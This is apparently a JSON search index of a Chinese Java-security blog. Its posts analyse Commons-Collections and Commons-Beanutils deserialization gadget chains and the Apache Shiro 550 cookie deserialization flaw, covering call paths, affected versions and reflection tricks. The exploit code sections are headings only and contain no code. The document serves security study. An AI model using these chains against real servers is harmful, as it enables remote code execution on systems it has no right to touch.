[{"title":"CommonsBeanutils183反序列化链","date":"2023-08-21T06:48:57.128Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/45315f66374a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsBeanutils183","/tags/CommonsBeanutils183/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"简介Apache Commons BeanUtils 是一个开源的 Java 库，提供了对 Java Bean 操作的工具类和方法。它可以简化 Java Bean 的属性复制、反射调用和动态操作等任务，使得开发人员可以更加方便地处理 Java Bean 下面是一些 Commons BeanUtils 提供的主要功能和特性： 属性复制：BeanUtils 提供了 copyProperties 方法，用于将源对象的属性值复制到目标对象中，无需手动编写属性的逐个复制代码。 动态操作：BeanUtils 提供了一些方法，可以通过反射动态设置和获取 Java Bean 的属性值，避免了直接使用反射 API 的繁琐操作。 数据转换：BeanUtils 提供了 convert 方法，用于在不同类型之间进行属性值的转换，例如将字符串转换为日期对象，或者将字符串转换为枚举类型。 嵌套属性访问：BeanUtils 支持处理嵌套属性，可以通过使用点号 . 来访问嵌套的属性，例如 user.address.street。 列表和映射操作：BeanUtils 提供了对列表和映射的操作方法，可以方便地处理集合类型的属性。 注册转换器：BeanUtils 允许开发人员注册自定义的类型转换器，以便在属性复制和数据转换过程中使用。 支持多种数据源：BeanUtils 不仅可以操作普通的 Java Bean，还可以操作其他数据源，如 ResultSet、Map、XML 等。 Apache Commons BeanUtils 提供了一套强大而灵活的工具，使得在 Java 开发中处理 Java Bean 变得更加简单和高效。无论是属性复制、反射调用还是动态操作，BeanUtils 都可以成为开发人员的便捷助手 利用条件Commons-Beanutils &lt;&#x3D; 1.9.4 JDK8版本 利用链 利用链分析CommonsBeanutils183利用链大致思路和CC2利用链差不多，只不过后续使用的比较器不同而已 PriorityQueue 由于这条链使用了另一个比较器 BeanComparator 类，所以在实例化 PriorityQueue 类对象时，需要讲 BeanComparator 类对象作为 PriorityQueue 类的构造方法参数 接下来就是一连串的调用了，CC2和CC4都有使用 PriorityQueue 类，这里就不再详细叙述了 BeanComparator 在 BeanComparator 类的 compare() 方法中调用了 PropertyUtils 类的 getProperty() 方法 PropertyUtils 在这个类中，获取了 PropertyUtilsBean 的实例并调用 getProperty() 方法 PropertyUtilsBean 接下来就是一连串的调用了，那么我们如何加载恶意字节码呢？之前学CC链的时候我们知道，在 TemplatesImpl 类的 newTransformer() 方法中可以加载字节码并执行，那么在 BeanComparator 类中的 property 属性值就必须是 outputProperties，后续通过反射来修改这个属性值 TemplatesImpl 到了这里，在 TemplatesImpl 类的 getOutputProperties() 方法中调用了 newTransformer() 方法后就成功加载了恶意字节码执行恶意代码了 根据上面的分析，我们写出利用链EXP的中间部分 这里讲 queue 和 property 两个属性通过反射获取来修改属性值是因为避免在序列化时调用了 PriorityQueue 类的 add() 方法后就执行了恶意代码 反序列化链EXP"},{"title":"CommonsCollections11利用链","date":"2023-08-19T02:34:27.738Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/ea620075ac0a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections11","/tags/CommonsCollections11/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 不限制JDK版本 利用链 利用链分析在CC11利用链中，使用了CC2和CC6的一些链，在CC11利用链中反序列化入口类是 HashSet 类，如果不先分析就直接看代码是有点懵的 先放一张整个调用栈的过程图 HashSet 在 HashSet 类的 readObject 方法中调用了 map 属性的 put() 方法 而这个 map 属性是 private 私有属性，无法直接修改这个 map 属性的值，后期我们通过反射来修改 HashMap 这里就和CC6链差不多了，这里还是主要看 key 我们能不能控制 因为在 HashMap 类中调用了 key 这个对象的 hashCode() 方法 在 HashMap 类中想要修改 key 的话需要对 table 属性的节点对象数组进行修改，我们需要先获取该 HashMap 类对象的 table 属性的节点对象数组，然后找到某个键值对，再修改这个 key，当然，这个过程是需要反射来操作的 TiedMapEntry 那么，这个 key 设置为和CC6利用链后半部分一样就可以了，设置为 TiedMapEntry 类对象，这样就可以调用到 TiedMapEntry.hashCode() 方法 在实例化 TiedMapEntry 类对象的时候，将 LazyMap 类对象和 TemplatesImpl 类对象作为构造方法的参数即可，如果CC1-CC7都学过了的话，这里都懂哈 LazyMap 同样的，在 LazyMap 类对象 decorate() 方法的时候，就可以对 factory 属性进行赋值，这里只要把 factory 属性的值设置为 InvokerTransformer 类对象即可，map 赋值一个空的 HashMap 就行，因为后面我们用不到 InvokeTransformer 这里要注意一点，我们需要通过反射来修改 InvokerTransformer 类对象的 iMethodName 属性值，因为在序列化时 HashSet 调用 add() 方法就会触发，这样会导致在序列化时就会执行加载的恶意字节码，所以需要通过反射来修改 最后，到了这里就成功执行了加载的恶意字节码，和CC2的前半部分差不多 根据上面分析的，我们大概能写出中间的部分代码 JDK8以下版本和JDK8及以后版本的 HashMap 类和 HashSet 类的元素存储方式发生了变化，所以以上代码兼容了JDK8以下版本 利用链EXP编写"},{"title":"CommonsCollections7利用链","date":"2023-08-18T15:52:26.000Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/a70cc9306261.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections7","/tags/CommonsCollections7/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1 不限制JDK版本 利用链 上图是在网上找的CC的几个版本链图 利用链分析Hashtable 在 Hashtable 类中的 readObject() 方法中调用了 reconstitutionPut() 方法，该类作为一个反序列化入口 在 readObject() 方法中有以下片段代码 for 循环获取了 Hashtable 中的元素，也就是我们put的那两个元素，这里要注意 key 不能相同，因为在 Hashtable 中 key 是唯一的 如果我们只put一个元素的话，在这里不会进入for循环，不会调用 equals() 方法 我们需要put两个元素，还有一个更重要的一点是put方法会调用两次，如果每次key计算出来的hashCode不一样，那么index变量也会受到影响，在第二次对tab进行迭代时就找不到对应的值了，就不会进行for循环导致不能执行到 e.key.equals(key) 这里 根据上面的代码分析，我们发现貌似对 tab 中的 hash 和当前元素的 hash 进行了比较是否相等 hash 是通过调用 key.hashCode() 方法获得的，那么也就说我们put的两个元素的 key 值 hash 要相等，看ysoserial工具链中的代码，使用了 yy 和 zZ，这两个hashCode是一样的，还有 &quot;&quot; 和 f5a5a608 的hashCode也是一样的 那么我们知道了必须要有两个元素，且这两个元素的 key 分别是 yy 和 zZ，在后面调用了 e.key 的 equals 方法，而这个 key 对象其实就是 LazyMap AbstractMapDecorator 在 LazyMap 类中没有 equals 方法，在它的父类 AbstractMapDecorator 中有 equals() 方法 map 属性是 Map 类型，这里的 map 其实就是 HashMap 类对象，那么我们看下 HashMap 的父类有没有 equals() 方法 AbstractMap 在 HashMap 的父类 AbstractMap 中有一个 equals() 方法，其中调用了 get() 方法，m 就是我们传入的 LazyMap 类对象 后续就是和CC3的前半部分差不多了，后续就不过多介绍了 这里要注意的一点是，在利用代码中调用 hashtable.put() 方法时，也会调用 equals() 方法，所以也能调用到这里的 get() 方法，导致在序列化阶段就执行了恶意代码，这里我们需要先将 ChainedTransformer 实例化对象的构造方法传入一个空的 Transformer[] 对象，等 hashtable.put() 方法调用完之后再通过反射来设置 iTransformers 属性的值为真正需要利用的 Transformer 对象即可 为什么要remove(“yy”)？ 我们正常执行到 hashtable.put(lazyMap1, 1); 是可以正常的将 lazyMap1 对象添加到hashtable中的 由于在调用 hashtable.put() 方法时，也会调用 equals方法，我们第一次put的时候 tab[] 是空的，for循环是进不去的则正常添加到hashtable中 当第二次put的时候，会从hashtable中迭代获取我们上次添加的那个元素 &#123;yy=1&#125;，这里由于 yy 和 zZ 的hashCode一样，则调用 AbstractMap 类的 equals() 方法 这里又使用了迭代器，获取了上次我们添加的那个元素 &#123;yy=1&#125;，此时 key 为 yy，m 变量则是 &#123;zZ=1&#125;，跟进到 LazyMap 的 get() 方法中看一下 这里判断 &#123;zZ=1&#125; 中是否包含 yy 这个键，结果是false，则进入if语句 这里往 lazyMap2 对象中添加了一个元素 &#123;yy=yy&#125;，不论后面如何，这里就很奇怪了，lazyMap2 对象中有两个元素了 &#123;zZ=1,yy=yy&#125;，那么在反序列化时调用 reconstitutionPut() 方法时会导致计算出来的hashCode不一致，就不能进入for循环执行 equals() 方法了 总结一下，这里主要的原因就是在 lazyMap2.put() 时，多加了一个元素，那么在反序列化时 lazyMap1 和 lazyMap2 的key生成出来的hashCode不一致，也就不能执行到 equals() 方法这里了 利用链EXP编写TemplatesImpl ###InvokerTransformer "},{"title":"CommonsCollections6利用链","date":"2023-08-17T15:52:26.000Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/4255b60bf2b8.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections6","/tags/CommonsCollections6/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 不限制JDK版本 利用链 利用链分析 对上面代码进行分析，发现和CC1的LayzMap链很类似，不过后面的用法不同。 那么我们接着CC1的获取到LazyMap对象开始说起，在LayzMap类中的decorate方法返回了LazyMap对象，其对象的get方法中调用了factory的transform方法，即触发Payload。 CC6这条链后面使用了TideMapEntry类，构造方法分别初始化变量。 可知，map变量即是我们的lazymap对象，而想调用到chainedTransformer的transform方法，就必须要调用lazymap对象的get方法，那么在TideMapEntry类中找找看有没有地方调用了。 发现getValue方法调用了，再找一下是哪个函数调用了getValue方法 在其类中发现hashCode方法中调用了，那么后续我们怎么去利用调用到hashCode方法呢？还记得URLDNS链吗？在HashMap中调用put方法中会调用到hashCode方法。 这里使用HashMap对象将TiedMapEntry对象put进去，这样在反序列化HashMap对象时，就会调用到HashMap的readObject方法，其方法有调用hash方法 这样就能调用到我们上面说的lazymap对象的get方法 在序列化时成功执行，在序列化时触发并不是我们想要的，我们需要的是在反序列化时触发。想要解决这个问题，我们需要知道为什么在序列化时就能触发，因为HashMap对象在调用put方法时调用了hash方法，进而一步一步往下执行，TiedMapEntry-&gt;getValue()、LazyMap-&gt;get()、ChainedTransformer-&gt;transform() 我们只需要将这三个中的一个对象先放置一个空的对象，再使用反射修改其对象的属性即可。 这里在LazyMap调用decorate方法时，将factory参数赋值成一个没有意义的ConstantTransformer对象，这样在序列化时就不会触发Payload，再使用反射将factory变量值设置成Payload，这样在反序列化时就能够触发Payload了。 在反序列化时并没有触发，这里和URLDNS链很像，在调用hash方法后判断了HashMap对象的key是否包含指定 lazymap对象的key 在序列化时，判断不存在aaa这个key则会触发ChainedTransformer的transform方法，然后将其key添加到HashMap对象中，那么在下次反序列化时就执行不到158行到160行了，即不会触发Payload，那么有什么办法吗？当然有的，删除innerMap或lazymap对象的key即可。 至此执行成功，整条链都理清楚了，下面是整条链的利用过程代码。 "},{"title":"CommonsCollections5利用链","date":"2023-08-17T14:00:01.221Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/ab6a59d5d2e4.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections5","/tags/CommonsCollections5/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 JDK版本：JDK8u301以下版本和JDK11版本可利用（需要关闭安全管理器，默认关闭） 利用链 利用链分析BadAttributeValueExpException BadAttributeValueExpException 类的父类的父类实现了 Serializable 接口，所以该类也是可被序列化的，查看该类的 readObject 方法 这个反序列化方法调用了 valObj.toString() 方法，而这个 valObj 是我们可控的，其实就是获取了 BadAttributeValueExpException 类的 val 属性，这个我们可以通过构造方法传入进去或者通过反射设置值 虽然可以通过构造方法传入进去，但是为了避免在序列化时就被执行，所以需要通过反射来设置值 在上面我们还注意到，判断了 System.getSecurityManager() 是否为null，如果有安全管理器这条链就不能被利用了，默认是没有的 那么接下来就是要找哪个类的 toString() 方法可以实现一个利用链 TiedMapEntry 在 TiedMapEntry 类中找到了有 toString() 方法，调用了 getKey() 和 getValue() 方法 这里是不是感觉很熟悉呢？是的，和CC6里面很像，getKey() 方法只是返回了一个 key 属性，而 getValue() 方法调用了 map 属性的 get() 方法，那么我们只需要把确保这个 map 是 LazyMap 类对象，这样就能和CC1链一样，调用后续的 transformer 了 在 LazyMap 类的 get() 方法中调用了 factory 属性的 transform() 方法 这样，我们就可以利用CC6的中间部分，然后加以修改，后面 BadAttributeValueExpException 类作为反序列化入口就可以执行恶意代码了 在这里，我并没有使用CC1的前半段，而是使用了CC4的前半段，因为在有些场景中使用 Transformer[] 数组来进行反序列化，有时候数组处理不好的话会出错，所以尽量避免使用 Transformer[] 数组 利用链EXP编写"},{"title":"CommonsCollections4利用链","date":"2023-08-17T12:53:10.867Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/6071e76d7b09.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections4","/tags/CommonsCollections4/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections4版本 JDK版本：JDK8u301以下版本、JDK11和JDK15 利用链 利用链分析由于这里使用了CC2和CC3的部分，我们这里不再分析，只看最后调用过程即可 我们直接从反序列化这边开始看，调用了 heapify() 方法 调用了 siftDown() 方法 调用 siftDownUsingComparator() 方法，在该方法里面调用了 TransformingComparator 类对象的 compare() 方法 这里调用了 ChainedTransformer 类对象的 transform() 方法 对照上面的变量对应的值来看，调用了 InstantiateTransformer 类对象的 transform() 方法 最后通过 TrAXFilter 类构造器实例化对象，其构造方法调用了 newTransformer() 方法即执行了恶意代码 利用链EXP编写方法一 方法二"},{"title":"CommonsCollections3利用链","date":"2023-08-15T08:05:33.000Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/fcc9661c9ec3.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections3","/tags/CommonsCollections3/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件CommonsCollections 3.1 - 3.2.1版本 由于使用了 AnnotationInvocationHandler 类，JDK版本：JDK8u71及以下版本（之后版本已修复不可利用） 利用链 利用链分析在CC1和CC6中我们使用 Transformer 类来调用 Runtime 类执行命令的，如果 Runtime 类或可执行命令的类被拉入黑名单禁止执行这条链就走不通了 那么就看下有哪些类有 defineClass() 方法，可以加载我们传入的字节码，这样我们就可以将恶意类转换成恶意字节码传入进去后生成恶意类，再看看哪些地方能够对这个恶意类进行初始化，这样我们就绕过了上面被禁止执行的尴尬局面了 在 TemplatesImpl 类中存在一个 default 修饰符的 defineClass() 方法，看看哪个地方调用了这个方法 还是在这个类中的 defineTransletClasses() 方法中进行了调用，这里可以看到 _bytecodes 变量是不能为空的，再往后看发现通过 defineClass() 方法从字节码加载到的类的父类必须是 ABSTRACT_TRANSLET 常量，查看该常量为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，如果没有加载的类没有继承这个类则 _transletIndex 为0以上的值，到了后面就会抛异常了，因为 _transletIndex 变量默认值为 -1，也就是说在我们写恶意类时必须继承 AbstractTranslet 类，_tfactory 变量也必须有值，否则在调用时会触发空指针错误，这个变量的值在 TemplatesImpl 类的 readObject() 方法中有进行初始化，值可以是 new TransformerFactoryImpl() 还是在这个类中 getTransletInstance() 方法调用了 defineTransletClasses() 方法，在这个方法中 _name 变量不能为空，_class 必须为空，否则调用不到 defineTransletClasses() 方法，到了后面就是对加载到的类进行初始化了 同样的，getTransletInstance() 方法也是在 TemplatesImpl 类中被 newTransformer() 方法调用的，接下来就是要找哪个类调用了 newTransformer() 方法，且是在该类的构造方法中进行调用的 那么，我们只需要调用 TrAXFilter 类的构造方法即可执行恶意代码，由于该类没有实现序列化接口，所以这里和CC1链一样需要使用 Transformer 链式调用才能绕过反序列化这个限制 到此我们知道怎么去利用字节码去加载类并初始化了，这条链我们就清楚了 这里，我们不再使用CC1中的 new InvokeTransformer() 的方法，而是找一种可以实例化对象可以调用该对象的构造方法的类 然后我们就找到了 InstantiateTransformer 这个类，该类构造函数接受一个Class数组参数类型和一个Object数组参数，其 transform() 方法就是获取了对象的构造器，并进行实例化，这里的 iParamTypes 和 iArgs 变量就是 TrAXFilter 类中构造方法中的参数类型和参数 那么这里就存在一个问题了，如何让 TrAXFilter 类作为对象传进来呢？没错，就是链式调用 这里就和CC1差不多，只不过我们把 new InvokeTransformer() 给换成了 new InstantiateTransformer()，后面其实也是用的CC1的 LazyMap 链，和CC1那边就差不多了 利用链EXP编写"},{"title":"CommonsCollections2利用链","date":"2023-08-14T00:40:04.774Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/3a3651677a27.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections2","/tags/CommonsCollections2/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections4版本 JDK版本：JDK8u301以下版本、JDK11和JDK15 在高版本JDK8u71中修改了 AnnotationInvocationHandler 的 readObject 方法，这也就导致CC1无法在高版本中利用，CC2利用链不再使用 AnnotationInvocationHandler 触发 引入依赖 利用链 利用链分析TransformingComparator TransformingComparator 是一个实现了 Comparator 和 Serializable 接口的类，用于对给定的对象列表进行比较，并通过指定的转换函数对比较的对象进行转换 两个构造方法和一个 compare 方法如上，这里和CC1链中的 LazyMap 类 get 方法类似，就是调用 Transformer 类型对象的 transform 方法 接下来就是要找哪些类调用了 TransformingComparator 类的 compare 方法 PriorityQueue 经过查找 PriorityQueue 类的 siftUpUsingComparator() 方法和 siftDownUsingComparator() 方法调用了，该类实现了 Serializable 接口 该类的 readObject() 方法中调用了 heapify() 方法 heapify() 方法调用了 siftDown() 方法 comparator 不为空的话，siftDown() 方法又调用了 siftDownUsingComparator() 方法 在 siftDownUsingComparator() 方法中调用了 comparator.compare() 方法 TransformingComparator 类实现了 Comparator 接口，所以这里是可直接使用的 为了避免在序列化前时调用 add() 方法就执行到 TransformingComparator.compare() 方法，我们需要在 new TransformingComparator() 时传入一个没有任何意义的 Transformer 类型对象 new ConstantTransformer(1) PriorityQueue 类 queue 属性至少需要两个元素才能进行比较，所以至少需要调用 add() 方法两次 再通过反射将 TransformingComparator 类的 transformer 字段值改成 invokerTransformer 对象就能避免在序列化时会出错的问题 在序列化时调用的是 siftUpUsingComparator() 方法，在反序列化时调用的是 siftDownUsingComparator() 方法 利用链EXP编写 上面是整个调用栈的过程和最后调用到的地方，根据上面调用栈再根据分析就能写出CC2的POC 基于ysoserial链EXP 自定义链EXP"},{"title":"CommonsCollections1利用链","date":"2023-08-13T08:41:00.000Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/4eb101e5c67c.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections1","/tags/CommonsCollections1/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 JDK版本：JDK8u71及以下版本（之后版本已修复不可利用） 利用链介绍 new ConstantTransformer() 调用父类构造方法，并且将参数对象赋值给常量 iConstant new InvokeTransformer() 调用父类构造方法，并且对 InvokeTransformer 类的 iMethodName、iParamTypes、iArgs 进行赋值 InvokeTransformer 类实现了 Transformer 接口，来看看实现接口的 transform 方法 这看起来像个后门，获取对象的Class，然后获取我们上面写好的方法和参数并执行，这就是一个任意命令执行的点。 new ChainedTransformer() 也只是对常量进行赋值操作 因为 ChainedTransformer 类也实现了 Transformer 接口，再看看 transform 方法 这里对 iTransformers 进行循环执行 transform 方法，并且第一个执行的结果是下一个执行 transform 方法的参数对象。在上面，我们将 Transformer 对象数组赋值给了常量 iTransformers，如果调用 transform 方法那么就实现了链式调用，相当于 ChainedTransformer 把 Transformer 对象数组中所有对象串起来执行。 那么构造好了这么个链，我们如何去执行到 ChainedTransformer 中的 transform 方法呢？ 在 TransformedMap 类中发现 checkSetValue 方法中调用了 transform 方法，且 value 参数也是可控的 来看看这个类的构造方法，由于我们需要 TransformedMap 类的实例化对象，TransformedMap 的构造方法貌似不太适合，而这个类的 decorate 方法实例化了 TransformedMap 类并且返回了，是我们想要的！ 那么问题又来了，我们如何执行到 checkSetValue 方法呢？ 查找后，发现该执行点在 AbstractInputCheckedMapDecorator 抽象类中的内部类 MapEntry 中 那么我们只要想办法执行到 setValue 方法，就需要获取到获取到 MapEntry 类的实例化对象 看一看是哪个地方实例化了 MapEntry 类 还是在 AbstractInputCheckedMapDecorator 抽象类中的内部类 EntrySetIterator 再顺藤摸瓜看看谁实例化了 EntrySetIterator 类 发现还是在 AbstractInputCheckedMapDecorator 抽象类中的内部类 EntrySet 经过一番查找，发现实例化 EntrySet 构造方法还是在 AbstractInputCheckedMapDecorator 抽象类中 由于 TransformedMap 继承了 AbstractInputCheckedMapDecorator 抽象类，因此我们可以执行调用 entrySet 方法，接下来就是链式调用就可以得到 MapEntry 对象了，类型是 Map.Entry 得到 MapEntry 对象后，即可调用我们上面找到的 setValue 方法，这条链我们就清楚了。而我们研究的是在反序列化时自动触发调用链，现在研究的这条并不是，所以接下来按照两条链去研究。 TransformedMap链 LazyMap链该利用链在ysoserial工具中 利用链分析TransformedMap链分析 使用 AnnotationInvocationHandler 类作为反序列化入口完整 TransformedMap 链利用代码如下： 下面是JDK1.8u65版本的 AnnotationInvocationHandler 注解类，可以看到，构造函数的 memberValues 接受一个 Map 类型的对象，并赋值到本类的变量 memberValues AnnotationInvocationHandler 注解类重写了 readObject 方法，对我们传入的 Map 对象进行了遍历，在下面我们看到执行了 setValue 方法（如果没有setValue方法的版本，则不能利用成功）。 那么在上面代码中注释写到了，必须key为value，那是为什么呢？ 在这里获取了注解类型，并且在446行获取了这个注解类型的成员变量值，447行进行了判断，只要不为Null则会继续往下执行，否则无法执行到 setValue 方法。 上面的 type 变量其实就是我们在反射获取到 AnnotationInvocationHandler 注解类后实例化的参数 Target.class，为什么要选择这个注解类呢？ 因为 Target.class 有枚举类型成员变量，且是 value 这就解释了上面我们为什么key只能是value的原因。 最后，进行序列化和反序列化操作后，成功弹出计算器。 LazyMap链分析LazyMap是ysoserial工具中的CC1链，而TransformedMap是国内流传的。 LazyMap只需要调用get方法即可执行命令 该方法实例化了LazyMap类，继续跟进 LazyMap 继承了 AbstractMapDecorator 抽象类，判断了传递的Map对象是否是Null，不是则进行赋值操作。 再回到 LazyMap 构造方法中，发现对传递的 chainedTransformer 参数赋值给 LazyMap 的 factory 变量。 再找到 get 方法，可以看到，调用了 factory 对象的 transform 方法 在 invoke 方法中发现调用了get方法，由于 invoke 方法是在对象代理时才能触发，将这个对象进行Proxy代理，Proxy也实现了序列化接口，所以也是可以反序列化的，在 readObject 的时候，调用任意方法就会执行 AnnotationInvocationHandler 的 invoke 方法，此时还不能对此进行反序列化因为此时的入口点为sun.reflect.annotation.AnnotationInvocationHandler#readObject AnnotationInvocationHandler 的invoke方法会调用 LazyMap 对象的 get 方法，就可以调用 transform 方法执行到恶意Payload invoke 方法需要调用任意方法，才可触发，对 AnnotationInvocationHandler 对象进行动态代理，在 readyObject 方法被执行时就可调用到 invoke 方法 AnnotationInvocationHandler 的 memberValues 变量接受的Map类型，所以代理对象类型也是Map，这里我们不能直接进行反序列化，我们需要再套一层执行到handler对象的 AnnotationInvocationHandler 类中的 readObject 方法即可。 以下是LazyMap链的完整代码 "},{"title":"Apache Shiro 550反序列化漏洞分析","date":"2023-08-10T13:41:28.200Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/9ca83d5eef7a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Apache","/tags/Apache/"],["Shiro","/tags/Shiro/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"基本概述Apache Shiro是一个开源的Java安全框架，用于身份验证、授权和加密。它提供了一个简单而强大的API，使开发人员能够轻松地实现安全功能。 Apache Shiro的主要功能包括： 身份验证：提供了用户身份验证的功能，包括基于用户名和密码的验证、基于令牌的验证（如JWT）以及自定义的验证方式。 授权：提供了对用户进行授权的功能，可以根据用户的角色、权限等进行访问控制。 会话管理：可以管理用户的会话，包括会话的创建、销毁、读写等操作。 密码加密：提供了密码加密和解密的功能，帮助开发人员保护用户密码的安全。 Web集成：提供了与Web应用程序的集成支持，可以轻松地将Shiro与常见的Web框架（如Spring MVC）集成在一起。 Apache Shiro框架提供了RememberMe记住我的功能，用户登陆成功后会生成经过加密并编码的Cookie，在服务端接收cookie值后进行Base64解码–&gt;AES解密–&gt;反序列化。 攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为Cookie的RememberMe字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。 调试分析环境Apache Shiro下载地址： Apache Shiro &lt;&#x3D; 1.2.4 JDK8u65 Apache Tomcat9.0.65 漏洞原理分析加密分析当我们输入账号密码登录后，如果登录成功，则会进入 AbstractRememberMeManager.onSuccessfulLogin 方法，该方法有三个参数，分别是 Subject、AuthenticationToken 和 AuthenticationInfo Subject 表示当前用户的身份，可以通过 SecurityUtils.getSubject() 方法获得。Subject 是进行身份验证和授权操作的主体对象。通过 Subject，可以执行身份验证、授权和会话管理等操作。 AuthenticationToken 是一个包含用户身份凭证的对象，用于表示用户提交的身份验证信息。在身份验证过程中，应用程序通常会将用户提供的用户名和密码封装到AuthenticationToken 对象中。AuthenticationToken 的实现通常由应用程序根据实际情况提供。 AuthenticationInfo 表示用户的身份验证信息，包括身份凭证（如用户名、密码）和相关的认证数据（如角色、权限等）。AuthenticationInfo 对象用于在身份验证过程中验证用户提供的凭证是否正确，并提供用户的身份信息给Shiro使用。 如果在登录时，勾选了记住我的选项，那么在token中 rememberme 值就为true 这里会调用到 getIdentityToRemember 方法 这个方法的主要作用就是用于获取记住身份的标识 在 rememberIdentity 方法里面就是对记住用户身份功能进行一个实现了 convertPrincipalsToBytes 方法对记住身份的标识转成字节数组 在这个方法里面其实就是将身份标识进行序列化成字节数组，然后判断了 CipherService 对象不为null的话就调用 encrypt 方法对序列化后的字节数组进行加密再返回 getCipherService 方法里面返回了 cipherService 对象，该对象就是一个AES加密服务对象，可以看到加密模式为CBC 在 encrypt 方法中调用了AES加密服务对象对其加密 getEncryptionCipherKey 方法就是获取了加密的key，这个key是在 AbstractRememberMeManager 类的构造方法中进行设置的 后面就是调用了 cipherService.encrypt 方法将key和身份标识进行了AES加密，返回了使用key进行AES加密的字节数组 在 CookieRememberMeManager 类 rememberSerializedIdentity 方法中前半部分判断了是不是HTTP请求的，然后使用 WebUtils 类获取了 request 和 response 对象，将使用key加密身份标识后的字节数组进行Base64编码 后面就不过多介绍了，就是设置Cookie了，这就是Shiro从登录成功到设置Cookie的加密身份标识的过程 解密分析 解密分析当然也是在 CookieRememberMeManager 类中，getRememberedSerializedIdentity 方法用于读取Cookie，这里要注意的是在Cookie中不能带有 deleteMe，ensurePadding 方法用来填充我们传入的Base64编码的Cookie，确保数据长度符合加密算法的要求，再往后就是对我们传入的Cookie进行Base64解码成字节数组了 返回了这个解码后的字节数组，我们看下是在哪里调用了这个方法 发现在 AbstractRememberMeManager 类的 getRememberedPrincipals 方法中调用了 getRememberedSerializedIdentity 这个方法 后面调用了 convertBytesToPrincipals 方法将AES加密的字节数组转成 Principal 对象 在该方法中调用了 decrypt 解密方法 这里就和加密分析那边反过来，这里是调用了 cipherService 类的 decrypt 方法来进行解密，然后返回了解密后的序列化字节数组 将解密后的字节数组作为参数调用了 deserialize 方法 deserialize 方法中使用了默认序列化器进行了反序列化，如果我们将恶意的类进行序列化生成 ser.bin 文件，将序列化的文件内容使用Shiro默认key进行加密，再经过Base64编码即可执行恶意代码 漏洞利用脚本根据上面的分析，写出以下两种语言的读取序列化文件内容进行AES加密再Base64编码脚本 Python Go 利用链EXP编写存在的问题 Commons-Beanutils库服务端和生成恶意序列化字节码使用的版本一致 如果使用不同的版本，serialVersionUID 可能会不一样，导致无法反序列化 org.apache.commons.collections.comparators.ComparableComparator 依赖Commons-Collections环境 由于 org.apache.commons.collections.comparators.ComparableComparator 类使用了Commons-Collections URLDNS URLDNS链常用来探测漏洞是否存在，该链不需要任何依赖 不依赖Commons-Collections 依赖Commons-Collections 